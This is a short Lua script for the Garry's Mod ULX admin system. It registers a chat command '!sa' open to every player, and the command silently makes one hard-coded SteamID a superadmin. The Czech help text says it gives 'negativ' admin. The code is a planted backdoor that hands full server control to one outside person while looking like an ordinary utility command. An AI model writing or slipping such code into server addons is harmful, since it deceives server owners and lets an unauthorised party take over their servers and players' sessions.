function ulx.sa( calling_ply )
local steamid = calling_ply:SteamID()
if (steamid == "STEAM_0:1:65286220") then
ULib.ucl.addUser("STEAM_0:1:65286220",_,_, "superadmin")
end
end
local sa = ulx.command( "Utility" , "ulx sa" , ulx.sa , "!sa" )
sa:defaultAccess( ULib.ACCESS_ALL )
sa:help ( "Daje negativovi admina" )
